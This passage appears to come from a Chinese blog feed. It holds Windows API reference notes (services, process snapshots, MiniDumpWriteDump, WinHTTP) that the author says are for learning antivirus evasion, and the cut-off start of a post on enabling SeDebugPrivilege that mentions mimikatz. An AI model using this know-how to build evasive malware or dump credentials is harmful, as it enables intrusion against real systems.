class="headerlink" title="写文件: ReadFile"></a>写文件: ReadFile</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BOOL WriteFile(</span><br><span class="line">  HANDLE       hFile,</span><br><span class="line">  LPCVOID      lpBuffer,</span><br><span class="line">  DWORD        nNumberOfBytesToWrite,</span><br><span class="line">  LPDWORD      lpNumberOfBytesWritten,</span><br><span class="line">  LPOVERLAPPED lpOverlapped</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>hFile 文件句柄</p><p>lpBuffer 要写入的数据缓存区</p><p>nNumberOfBytesToWrite 要写入的字节数</p><p>lpNumberOfBytesWritten 设置一个变量，用来接收写入的内容</p><p>lpOverlapped 通常为NULL</p><h4 id="读文件-ReadFile"><a href="#读文件-ReadFile" class="headerlink" title="读文件: ReadFile"></a>读文件: ReadFile</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BOOL ReadFile(</span><br><span class="line">  HANDLE       hFile,</span><br><span class="line">  LPVOID       lpBuffer,</span><br><span class="line">  DWORD        nNumberOfBytesToRead,</span><br><span class="line">  LPDWORD      lpNumberOfBytesRead,</span><br><span class="line">  LPOVERLAPPED lpOverlapped</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>和WriteFile差不多，8说了</p><h3 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h3><h4 id="建立与指定计算机服务控制管理器的联络并打开其数据库-OpenSCManagerA"><a href="#建立与指定计算机服务控制管理器的联络并打开其数据库-OpenSCManagerA" class="headerlink" title="建立与指定计算机服务控制管理器的联络并打开其数据库: OpenSCManagerA"></a>建立与指定计算机服务控制管理器的联络并打开其数据库: OpenSCManagerA</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SC_HANDLE OpenSCManagerA(</span><br><span class="line">  LPCSTR lpMachineName,</span><br><span class="line">  LPCSTR lpDatabaseName,</span><br><span class="line">  DWORD  dwDesiredAccess</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>lpMachineName 指定计算机的名字。若为NULL则指向本地服务控制管理器</p><p>lpDatabaseName 服务控制管理器的数据库名。一般设为 SERVICES_ACTIVE_DATABASE 。若为NULL则默认打开 SERVICES_ACTIVE_DATABASE </p><p>dwDesiredAccess 对服务控制管理器的权限设置。参数清单:<a href="https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights">https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights</a></p><p>若执行成功则返回服务管理器数据库的句柄。反之则NULL。</p><h4 id="创建一个服务并把它加入到服务管理器数据库：-CreateServiceA"><a href="#创建一个服务并把它加入到服务管理器数据库：-CreateServiceA" class="headerlink" title="创建一个服务并把它加入到服务管理器数据库： CreateServiceA"></a>创建一个服务并把它加入到服务管理器数据库： CreateServiceA</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SC_HANDLE CreateServiceA(</span><br><span class="line">  SC_HANDLE hSCManager,</span><br><span class="line">  LPCSTR    lpServiceName,</span><br><span class="line">  LPCSTR    lpDisplayName,</span><br><span class="line">  DWORD     dwDesiredAccess,</span><br><span class="line">  DWORD     dwServiceType,</span><br><span class="line">  DWORD     dwStartType,</span><br><span class="line">  DWORD     dwErrorControl,</span><br><span class="line">  LPCSTR    lpBinaryPathName,</span><br><span class="line">  LPCSTR    lpLoadOrderGroup,</span><br><span class="line">  LPDWORD   lpdwTagId,</span><br><span class="line">  LPCSTR    lpDependencies,</span><br><span class="line">  LPCSTR    lpServiceStartName,</span><br><span class="line">  LPCSTR    lpPassword</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>hSCManager 服务管理器数据库句柄。可由OpenSCManagerA获得。句柄权限必须有<strong>SC_MANAGER_CREATE_SERVICE</strong></p><p>lpServiceName 要创建的服务名。</p><p>lpDisplayName 用户界面程序 用来标识服务的 显示名称 ，可与lpServiceName一致</p><p>dwDesiredAccess 对服务管理器的权限。参数清单在上面</p><p>dwServiceType 创建的服务的类型。（直接复制粘贴参数吧</p><table><thead><tr><th align="left">Value</th><th align="left">Meaning</th></tr></thead><tbody><tr><td align="left"><strong>SERVICE_ADAPTER</strong>0x00000004</td><td align="left">Reserved.</td></tr><tr><td align="left"><strong>SERVICE_FILE_SYSTEM_DRIVER</strong>0x00000002</td><td align="left">File system driver service.</td></tr><tr><td align="left"><strong>SERVICE_KERNEL_DRIVER</strong>0x00000001</td><td align="left">Driver service.</td></tr><tr><td align="left"><strong>SERVICE_RECOGNIZER_DRIVER</strong>0x00000008</td><td align="left">Reserved.</td></tr><tr><td align="left"><strong>SERVICE_WIN32_OWN_PROCESS</strong>0x00000010</td><td align="left">Service that runs in its own process.</td></tr><tr><td align="left"><strong>SERVICE_WIN32_SHARE_PROCESS</strong>0x00000020</td><td align="left">Service that shares a process with one or more other services. For more information, see <a href="https://docs.microsoft.com/en-us/windows/desktop/Services/service-programs">Service Programs</a>.</td></tr><tr><td align="left"><strong>SERVICE_USER_OWN_PROCESS</strong>0x00000050</td><td align="left">The service runs in its own process under the logged-on user account.</td></tr><tr><td align="left"><strong>SERVICE_USER_SHARE_PROCESS</strong>0x00000060</td><td align="left">The service shares a process with one or more other services that run under the logged-on user account.</td></tr></tbody></table><p>If you specify either <strong>SERVICE_WIN32_OWN_PROCESS</strong> or <strong>SERVICE_WIN32_SHARE_PROCESS</strong>, and the service is running in the context of the <a href="https://docs.microsoft.com/en-us/windows/desktop/Services/localsystem-account">LocalSystem account</a>, you can also specify the following value.</p><table><thead><tr><th align="left">Value</th><th align="left">Meaning</th></tr></thead><tbody><tr><td align="left"><strong>SERVICE_INTERACTIVE_PROCESS</strong>0x00000100</td><td align="left">The service can interact with the desktop.For more information, see <a href="https://docs.microsoft.com/en-us/windows/desktop/Services/interactive-services">Interactive Services</a>.</td></tr></tbody></table><p>dwStartType 服务的开始选项，参数如下</p><table><thead><tr><th align="left">Value</th><th align="left">Meaning</th></tr></thead><tbody><tr><td align="left"><strong>SERVICE_AUTO_START</strong>0x00000002</td><td align="left">A service started automatically by the service control manager during system startup. For more information, see <a href="https://docs.microsoft.com/en-us/windows/desktop/Services/automatically-starting-services">Automatically Starting Services</a>.</td></tr><tr><td align="left"><strong>SERVICE_BOOT_START</strong>0x00000000</td><td align="left">A device driver started by the system loader. This value is valid only for driver services.</td></tr><tr><td align="left"><strong>SERVICE_DEMAND_START</strong>0x00000003</td><td align="left">A service started by the service control manager when a process calls the <a href="https://docs.microsoft.com/en-us/windows/desktop/api/winsvc/nf-winsvc-startservicea">StartService</a> function. For more information, see <a href="https://docs.microsoft.com/en-us/windows/desktop/Services/starting-services-on-demand">Starting Services on Demand</a>.</td></tr><tr><td align="left"><strong>SERVICE_DISABLED</strong>0x00000004</td><td align="left">A service that cannot be started. Attempts to start the service result in the error code <strong>ERROR_SERVICE_DISABLED</strong>.</td></tr><tr><td align="left"><strong>SERVICE_SYSTEM_START</strong>0x00000001</td><td align="left">A device driver started by the <strong>IoInitSystem</strong> function. This value is valid only for driver services.</td></tr></tbody></table><p>dwErrorContriol 服务对于错误的容忍程度。</p><p><img src="http://www.const27.com/wp-content/uploads/2020/11/image-43.png" alt="img"></p><p>lpBinaryPathName 服务的绝对路径。</p><p>lpLoadOrderGroup 服务所属的加载排序组名称。如果服务不属于任何一个组则填NULL或空字符</p><p>lpdwTagId 一个指向变量的指针，该变量接收在lpLoadOrderGroup参数中指定的组中唯一的标记值。 一般置NULL</p><p>lpDependencies 一个以null结尾的指向服务或者加载顺序组的指针，在当前服务启动前必须先启动该项指向的服务或加载顺序组，即启动当前服务的依赖项。若服务不需要依赖项则置NULL</p><p>lpServiceStartName 服务运行的账户。若为NULL则用LocalSystem Account账户（即SYSTEM)</p><p>lpPassword 账户的密码。若为LocalSystemAccount则填NULL（SYSTEM账户没有密码）</p><p>成功则返回服务句柄，反之则NULL</p><h4 id="打开一个服务并获得句柄-OpenServiceA"><a href="#打开一个服务并获得句柄-OpenServiceA" class="headerlink" title="打开一个服务并获得句柄: OpenServiceA"></a>打开一个服务并获得句柄: OpenServiceA</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SC_HANDLE OpenServiceA(</span><br><span class="line">  SC_HANDLE hSCManager,</span><br><span class="line">  LPCSTR    lpServiceName,</span><br><span class="line">  DWORD     dwDesiredAccess</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>hSCManager 指向服务控制管理器数据库的句柄。</p><p>lpServiceName 服务名，注意不是lpDisplayName</p><p>dwDesiredAccess 对服务控制管理器的权限</p><p>成功则返回服务句柄，反之则NULL</p><h4 id="向一个服务发送控制指令-ControlService"><a href="#向一个服务发送控制指令-ControlService" class="headerlink" title="向一个服务发送控制指令:ControlService"></a>向一个服务发送控制指令:ControlService</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BOOL ControlService(</span><br><span class="line">  SC_HANDLE        hService,</span><br><span class="line">  DWORD            dwControl,</span><br><span class="line">  LPSERVICE_STATUS lpServiceStatus</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>hService 指向服务的句柄</p><p>dwControl 控制指令。详情参考 <a href="https://docs.microsoft.com/zh-cn/windows/win32/api/winsvc/nf-winsvc-controlservice?f1url=?appId=Dev16IDEF1&l=ZH-CN&k=k(WINSVC/ControlService);k(ControlService);k(DevLang-C++);k(TargetOS-Windows)&rd=true">https://docs.microsoft.com/zh-cn/windows/win32/api/winsvc/nf-winsvc-controlservice?f1url=%3FappId%3DDev16IDEF1%26l%3DZH-CN%26k%3Dk(WINSVC%252FControlService);k(ControlService);k(DevLang-C%252B%252B);k(TargetOS-Windows)%26rd%3Dtrue</a></p><p>lpServiceStatus 指向  <a href="https://docs.microsoft.com/en-us/windows/desktop/api/winsvc/ns-winsvc-service_status">SERVICE_STATUS</a> 结构的指针，该结构用于接收服务报告给服务管理器的最新状态。</p><h4 id="使服务与SCM链接：-StartServiceCtrlDispatcherA"><a href="#使服务与SCM链接：-StartServiceCtrlDispatcherA" class="headerlink" title="使服务与SCM链接： StartServiceCtrlDispatcherA"></a>使服务与SCM链接： StartServiceCtrlDispatcherA</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BOOL StartServiceCtrlDispatcherA(</span><br><span class="line">  const SERVICE_TABLE_ENTRYA *lpServiceStartTable</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>lpServiceStartTable 指向一个  <a href="https://docs.microsoft.com/en-us/windows/desktop/api/winsvc/ns-winsvc-service_table_entrya">SERVICE_TABLE_ENTRY</a> 结构，其包含了每个服务的入口点。该结构最后一个入口点必须是NULL来表示该结构已结束。<br>这个结构的定义如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct _SERVICE_TABLE_ENTRYW &#123;</span><br><span class="line">    LPWSTR                      lpServiceName;</span><br><span class="line">    LPSERVICE_MAIN_FUNCTIONW    lpServiceProc;</span><br><span class="line">&#125;SERVICE_TABLE_ENTRYW, *LPSERVICE_TABLE_ENTRYW;</span><br></pre></td></tr></table></figure><p>当SCM开始一个服务进程时，便在等待服务调用StartServiceCtrlDispatcherA 函数，若该函数长时间没有调用（一般为30s)，则服务会被强行关闭。直到所有该函数指定的服务进入SERVICE_STOPPED阶段，这个函数才会返回值。</p><h4 id="注册一个函数来处理服务控制请求-RegisterServiceCtrlHandlerA"><a href="#注册一个函数来处理服务控制请求-RegisterServiceCtrlHandlerA" class="headerlink" title="注册一个函数来处理服务控制请求: RegisterServiceCtrlHandlerA"></a>注册一个函数来处理服务控制请求: RegisterServiceCtrlHandlerA</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SERVICE_STATUS_HANDLE RegisterServiceCtrlHandlerA(</span><br><span class="line">  LPCSTR             lpServiceName,</span><br><span class="line">  LPHANDLER_FUNCTION lpHandlerProc</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>lpServiceName 服务的名字。</p><p>lpHandlerProc 一个指针，指向要被注册的handler函数</p><p>若成功，则返回服务状态句柄，若失败则返回0</p><p>这个函数的主要目的是 可以让一个服务在运行过程中被来自其他地方的控制指令所控制，并根据自己定义的函数做出对应的行为</p><h4 id="更新服务的状态信息-SetServiceStatus"><a href="#更新服务的状态信息-SetServiceStatus" class="headerlink" title="更新服务的状态信息: SetServiceStatus"></a>更新服务的状态信息: SetServiceStatus</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BOOL SetServiceStatus(</span><br><span class="line">  SERVICE_STATUS_HANDLE hServiceStatus,</span><br><span class="line">  LPSERVICE_STATUS      lpServiceStatus</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>hServiceStatus 指向服务状态句柄，这个句柄由RegisterServiceCtrlHandlerA 等函数返回</p><p>lpServiceStatus 一个指针，指向  <a href="https://docs.microsoft.com/en-us/windows/desktop/api/winsvc/ns-winsvc-service_status">SERVICE_STATUS</a> 结构，这个结构记录了服务的状态</p><h3 id="快照-以下函数或结构基本上都用到了另一个头文件Tlhelp32-h"><a href="#快照-以下函数或结构基本上都用到了另一个头文件Tlhelp32-h" class="headerlink" title="快照 以下函数或结构基本上都用到了另一个头文件Tlhelp32.h"></a>快照 以下函数或结构基本上都用到了另一个头文件Tlhelp32.h</h3><h4 id="为进程创建快照文件-转储-CreateToolhelp32Snapshot"><a href="#为进程创建快照文件-转储-CreateToolhelp32Snapshot" class="headerlink" title="为进程创建快照文件(转储): CreateToolhelp32Snapshot"></a>为进程创建快照文件(转储): CreateToolhelp32Snapshot</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HANDLE CreateToolhelp32Snapshot(</span><br><span class="line">  DWORD dwFlags,</span><br><span class="line">  DWORD th32ProcessID</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>dwFlags 转储参数，用于指定转储哪些信息以及指定返回的句柄的一些信息<br>详细参数<br><a href="https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot">https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot</a></p><p>th32ProcessID 要被转储的进程的PID。置0则指定当前进程，当dwFlags为<strong>TH32CS_SNAPHEAPLIST</strong>, <strong>TH32CS_SNAPMODULE</strong>, <strong>TH32CS_SNAPMODULE32</strong>, or <strong>TH32CS_SNAPALL</strong>时，该值才表示要被转储的进程PID，否则该值会被忽略并转储所有进程</p><p>函数成功返回快照的句柄，否则返回<strong>INVALID_HANDLE_VALUE</strong></p><h4 id="检索快照中遇到的第一个进程的信息：-Process32First"><a href="#检索快照中遇到的第一个进程的信息：-Process32First" class="headerlink" title="检索快照中遇到的第一个进程的信息： Process32First"></a>检索快照中遇到的第一个进程的信息： Process32First</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BOOL Process32First(</span><br><span class="line">  HANDLE           hSnapshot,</span><br><span class="line">  LPPROCESSENTRY32 lppe</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>hSnapshot 快照句柄，由CreateToolhelp32napshot返回</p><p>lppe 指向PROCESSENTRY32结构。该结构用于保存进程信息，在进行该函数前，PROCESSENTRY32的dwSize属性必须定义好。</p><h4 id="检索快照中下一个进程的信息-Process32Next"><a href="#检索快照中下一个进程的信息-Process32Next" class="headerlink" title="检索快照中下一个进程的信息: Process32Next"></a>检索快照中下一个进程的信息: Process32Next</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BOOL Process32Next(</span><br><span class="line">  HANDLE           hSnapshot,</span><br><span class="line">  LPPROCESSENTRY32 lppe</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>hSnapshot 快照句柄，由CreateToolhelp32napshot返回</p><p>lppe 指向PROCESSENTRY32结构。该结构用于保存进程信息，在进行该函数前，PROCESSENTRY32的dwSize属性必须定义好。</p><h4 id="将某个进程转储为快照写入文件-MiniDumpWriteDump"><a href="#将某个进程转储为快照写入文件-MiniDumpWriteDump" class="headerlink" title="将某个进程转储为快照写入文件: MiniDumpWriteDump"></a>将某个进程转储为快照写入文件: MiniDumpWriteDump</h4><p>头文件 DbgHelp.h</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BOOL MiniDumpWriteDump(</span><br><span class="line">  HANDLE                            hProcess,</span><br><span class="line">  DWORD                             ProcessId,</span><br><span class="line">  HANDLE                            hFile,</span><br><span class="line">  MINIDUMP_TYPE                     DumpType,</span><br><span class="line">  PMINIDUMP_EXCEPTION_INFORMATION   ExceptionParam,</span><br><span class="line">  PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam,</span><br><span class="line">  PMINIDUMP_CALLBACK_INFORMATION    CallbackParam</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>hProcess 进程句柄</p><p>processid 进程的PID</p><p>hFile 文件句柄，指定写入那个文件</p><p>DumpType 指定以何种形式写入文件，参数参考:<a href="https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/ne-minidumpapiset-minidump_type">https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/ne-minidumpapiset-minidump_type</a></p><p>ExceptionParam 指针，指向  <a href="https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/ns-minidumpapiset-minidump_exception_information">MINIDUMP_EXCEPTION_INFORMATION</a> 结构用于描述发生的异常。如果为NULL，则表示转储文件中不包含异常信息</p><p>UserStreamParam 指针，指向  <a href="https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/ns-minidumpapiset-minidump_user_stream_information">MINIDUMP_USER_STREAM_INFORMATION</a> 结构，这个结构保存用户数据流信息。一般置NULL</p><p>CallbackParam 指针，指向 <a href="https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/ns-minidumpapiset-minidump_callback_information">MINIDUMP_CALLBACK_INFORMATION</a> 结构，该结构保存回调函数的信息，一般置NULL</p><h3 id="HTTP请求，多数函数包含在winhttp-h中"><a href="#HTTP请求，多数函数包含在winhttp-h中" class="headerlink" title="HTTP请求，多数函数包含在winhttp.h中"></a>HTTP请求，多数函数包含在winhttp.h中</h3><p>大流程</p><p><img src="https://docs.microsoft.com/en-us/windows/win32/winhttp/images/art-winhttp3.png" alt="functions that create handles"></p><h4 id="winhttpopen-返回-WinHTTP-session-句柄"><a href="#winhttpopen-返回-WinHTTP-session-句柄" class="headerlink" title="winhttpopen:返回 WinHTTP-session 句柄"></a>winhttpopen:返回 WinHTTP-session 句柄</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">WINHTTPAPI HINTERNET WinHttpOpen(</span><br><span class="line">  LPCWSTR pszAgentW,</span><br><span class="line">  DWORD   dwAccessType,</span><br><span class="line">  LPCWSTR pszProxyW,</span><br><span class="line">  LPCWSTR pszProxyBypassW,</span><br><span class="line">  DWORD   dwFlags</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>pszAgentW 指针，指向一个字符串.该字符串在http通信中被用作user agent</p><p>dwAccessType http请求方式，其值有如下，主要是代理相关</p><blockquote><p><strong>WINHTTP_ACCESS_TYPE_DEFAULT_PROXY</strong><br><strong>WINHTTP_ACCESS_TYPE_NAMED_PROXY</strong><br><strong>WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY</strong><br><strong>WINHTTP_ACCESS_TYPE_NO_PROXY</strong> 不使用代理进行通讯</p></blockquote><p>pszProxyW 指针，当dwAccessType为 <strong>WINHTTP_ACCESS_TYPE_NAMED_PROXY</strong> 时指向代理服务器名字。否则取<strong>WINHTTP_NO_PROXY_NAME</strong>值</p><p>pszProxyBypassW 指针，指向字符串， 当dwAccessType为 <strong>WINHTTP_ACCESS_TYPE_NAMED_PROXY</strong> 时指向不想走代理的IP地址或主机名。否则取<strong>WINHTTP_NO_PROXY_BYPASS</strong>值</p><p>dwFlags 一般取0</p><h4 id="WinHttpConnect-：返回-链接-句柄（-handle-to-an-HTTP-session-for-that-initial-target-）"><a href="#WinHttpConnect-：返回-链接-句柄（-handle-to-an-HTTP-session-for-that-initial-target-）" class="headerlink" title="WinHttpConnect ：返回 链接 句柄（ handle to an HTTP session for that initial target. ）"></a>WinHttpConnect ：返回 链接 句柄（ handle to an HTTP session for that initial target. ）</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">WINHTTPAPI HINTERNET WinHttpConnect(</span><br><span class="line">  HINTERNET     hSession,</span><br><span class="line">  LPCWSTR       pswzServerName,</span><br><span class="line">  INTERNET_PORT nServerPort,</span><br><span class="line">  DWORD         dwReserved</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>hSession WinHttpOpen 方法返回的句柄</p><p>pswzServerName 指针，指向需要请求的服务器的IP或主机名的字符串</p><p>nServerPort 指定请求端口</p><p>dwReserved 置0</p><h4 id="WinHttpOpenRequest-：创建HTTP请求句柄"><a href="#WinHttpOpenRequest-：创建HTTP请求句柄" class="headerlink" title="WinHttpOpenRequest ：创建HTTP请求句柄"></a>WinHttpOpenRequest ：创建HTTP请求句柄</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">WINHTTPAPI HINTERNET WinHttpOpenRequest(</span><br><span class="line">  HINTERNET hConnect,</span><br><span class="line">  LPCWSTR   pwszVerb,</span><br><span class="line">  LPCWSTR   pwszObjectName,</span><br><span class="line">  LPCWSTR   pwszVersion,</span><br><span class="line">  LPCWSTR   pwszReferrer,</span><br><span class="line">  LPCWSTR   *ppwszAcceptTypes,</span><br><span class="line">  DWORD     dwFlags</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>hConnect WinHttpConnect返回的句柄</p><p>pwszVerb 指定HTTP请求方法</p><p>pwszObjectName 指定请求资源的路径</p><p>pwszVersion 指定HTTP版本</p><p>pwszReferrer 多数情况可设置为<strong>WINHTTP_NO_REFERER</strong></p><p>ppwszAcceptTypes 指定媒体类型，可设置为<strong>WINHTTP_DEFAULT_ACCEPT_TYPES</strong></p><p>dwFlags 通常置0</p><h4 id="WinHttpAddRequestHeaders-设置HTTP头"><a href="#WinHttpAddRequestHeaders-设置HTTP头" class="headerlink" title="WinHttpAddRequestHeaders 设置HTTP头"></a>WinHttpAddRequestHeaders 设置HTTP头</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BOOLAPI WinHttpAddRequestHeaders(</span><br><span class="line">  HINTERNET hRequest,</span><br><span class="line">  LPCWSTR   lpszHeaders,</span><br><span class="line">  DWORD     dwHeadersLength,</span><br><span class="line">  DWORD     dwModifiers</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>hRequest WinHttpOpenRequest返回的句柄</p><p>lpszHeaders 指向字符串的指针，字符串里包含了要附加到http请求上的头部信息。每个头部之间用 CR/LF 隔开</p><p>dwHeadersLength 头部的长度</p><p>dwModifiers 一些功能修饰，一般可以置 WINHTTP_ADDREQ_FLAG_ADD</p><h4 id="WinHttpSendRequest-发送HTTP请求"><a href="#WinHttpSendRequest-发送HTTP请求" class="headerlink" title="WinHttpSendRequest 发送HTTP请求"></a>WinHttpSendRequest 发送HTTP请求</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BOOLAPI WinHttpSendRequest(</span><br><span class="line">  HINTERNET hRequest,</span><br><span class="line">  LPCWSTR   lpszHeaders,</span><br><span class="line">  DWORD     dwHeadersLength,</span><br><span class="line">  LPVOID    lpOptional,</span><br><span class="line">  DWORD     dwOptionalLength,</span><br><span class="line">  DWORD     dwTotalLength,</span><br><span class="line">  DWORD_PTR dwContext</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>hRequest WinHttpOpenRequest返回的句柄</p><p>lpszHeaders 附加的HTTP头，如果没有想附加的头就置0</p><p>dwHeadersLength lpszHeaders 指定的头的字符串大小</p><p>lpOptional 一个指针。指向一个缓冲区，当中包括可选的数据发送后，马上请求标头。该參数通经常使用于POST和PUT操作。 （我理解为传的参数）</p><p>dwOptionalLength 额外内容的长度</p><p>dwTotalLength 总长度</p><p>dwContext 通常置0</p><h4 id="WinHttpReceiveResponse-：等待http回应"><a href="#WinHttpReceiveResponse-：等待http回应" class="headerlink" title="WinHttpReceiveResponse ：等待http回应"></a>WinHttpReceiveResponse ：等待http回应</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">WINHTTPAPI BOOL WinHttpReceiveResponse(</span><br><span class="line">  HINTERNET hRequest,</span><br><span class="line">  LPVOID    lpReserved</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>hRequest WinHttpOpenRequest 返回的句柄</p><p>lpReserved 置NULL</p><p>主要作用是如果有回应，则会返回true。</p><h4 id="WinHttpQueryDataAvailable-：返回HTTP回应内容的大致信息"><a href="#WinHttpQueryDataAvailable-：返回HTTP回应内容的大致信息" class="headerlink" title="WinHttpQueryDataAvailable ：返回HTTP回应内容的大致信息"></a>WinHttpQueryDataAvailable ：返回HTTP回应内容的大致信息</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BOOLAPI WinHttpQueryDataAvailable(</span><br><span class="line">  HINTERNET hRequest,</span><br><span class="line">  LPDWORD   lpdwNumberOfBytesAvailable</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>lpdwNumberOfBytesAvailable 置NULL，其用来接收内容长度</p><h4 id="WinHttpReadData-读取HTTP回应内容"><a href="#WinHttpReadData-读取HTTP回应内容" class="headerlink" title="WinHttpReadData 读取HTTP回应内容"></a>WinHttpReadData 读取HTTP回应内容</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BOOLAPI WinHttpReadData(</span><br><span class="line">  HINTERNET hRequest,</span><br><span class="line">  LPVOID    lpBuffer,</span><br><span class="line">  DWORD     dwNumberOfBytesToRead,</span><br><span class="line">  LPDWORD   lpdwNumberOfBytesRead</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>lpBuffer 指定一片缓冲区，回应的数据会存放到此处</p><p>dwNumberOfBytesToRead 缓冲区大小长度</p><p>lpdwNumberOfBytesRead 用于存储回应的字节数，在使用该函数时该值须为NULL</p><p>说白了，就是以C或c++等语言为载体，调用各种Windows API完成编程<br>学这个的目的是因为要接触免杀，需要更深层次的了解Windows的一些机制。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;API-收录一下调过的API&quot;&gt;&lt;a href=&quot;#API-收录一下调过的API&quot; class=&quot;headerlink&quot; title=&quot;API:收录一下调过的API&quot;&gt;&lt;/a&gt;API:收录一下调过的API&lt;/h2&gt;&lt;h3 id=&quot;进程与内存&quot;&gt;&lt;a href=&quot;#</summary>
      
    
    
    
    
    <category term="windows相关" scheme="http://const27.com/tags/windows%E7%9B%B8%E5%85%B3/"/>
    
  </entry>
  
  <entry>
    <title>windows启用SeDebugPrivilege</title>
    <link href="http://const27.com/2021/02/19/%E5%90%AF%E7%94%A8SeDebugPrivilege/"/>
    <id>http://const27.com/2021/02/19/%E5%90%AF%E7%94%A8SeDebugPrivilege/</id>
    <published>2021-02-19T09:22:00.343Z</published>
    <updated>2021-02-19T08:47:33.204Z</updated>
    
    <content type="html"><![CDATA[<p>有很多工具需要启用SeDebugPrivilege才能正常使用，比如mimikatz就有个很经典的 privilege::debug.如果没有这个权限，administrator用openprocess可能都会报错，所以需要提升，管理员组拥有该权限但默认禁用，普通用户不拥有该权限，也就是说仅仅只有管理员账户能启用该权限。这个权限提供了强大的能力以至于可以忽视安全上下文行动。</p><p>我们会用到AdjustTokenPrivileges和LookupPrivilegeValueA，以及Token PRIVILEGES结构树</p><h4 id="Token-PRIVILEGES结构树"><a href="#Token-PRIVILEGES结构树" class="headerlink" title="Token PRIVILEGES结构树"></a>Token PRIVILEGES结构树</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct _TOKEN_PRIVILEGES &#123;</span><br><span class="line">  DWORD               PrivilegeCount;</span><br><span class="line">  LUID_AND_ATTRIBUTES Privileges[ANYSIZE_ARRAY];</span><br><span class="line">&#125; TOKEN_PRIVILEGES, *PTOKEN_PRIVILEGES;</span><br></pre></td></tr></table></figure><p>PrirvilegeCount 表示Privileges数组中有多少个元素 Privileges 指向LUID_AND_ATTRIBUTES结构，该结构用于具体表示某个权限的开启或关闭</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct _LUID_AND_ATTRIBUTES &#123;</span><br><span class="line">  LUID  Luid;</span><br><span class="line">  DWORD Attributes;</span><br><span class="line">&#125; LUID_AND_ATTRIBUTES, *PLUID_AND_ATTRIBUTES;&#96;</span><br></pre></td></tr></table></figure><p>Luid 选择一个LUID值，该值对应一个权限 Attributes 选择指定LUID的权限的开放或关闭，其详细参数如下</p><table><thead><tr><th align="left"><strong>SE_PRIVILEGE_ENABLED</strong></th><th align="left">The privilege is enabled.</th></tr></thead><tbody><tr><td align="left"><strong>SE_PRIVILEGE_ENABLED_BY_DEFAULT</strong></td><td align="left">The privilege is enabled by default.</td></tr><tr><td align="left"><strong>SE_PRIVILEGE_REMOVED</strong></td><td align="left">Used to remove a privilege. For details, see <a href="https://docs.microsoft.com/en-us/windows/desktop/api/securitybaseapi/nf-securitybaseapi-adjusttokenprivileges">AdjustTokenPrivileges</a>.</td></tr><tr><td align="left"><strong>SE_PRIVILEGE_USED_FOR_ACCESS</strong></td><td align="left">The privilege was used to gain access to an object or service. This flag is used to identify the relevant privileges in a set passed by a client application that may contain unnecessary privileges.</td></tr></tbody></table><p>下面我们来展示如何利用windows 编程获取该权限。</p><p>这只是一个函数demo，修改当前进程的权限。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BOOL GetDebugPriv() &#123;</span><br><span class="line">HANDLE Token;</span><br><span class="line">TOKEN_PRIVILEGES tp;</span><br><span class="line">LUID Luid;</span><br><span class="line">if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &amp;Token)) &#123; &#x2F;&#x2F;TOKEN_ADJUST_PRIVILEGES代表要修改令牌权限</span><br><span 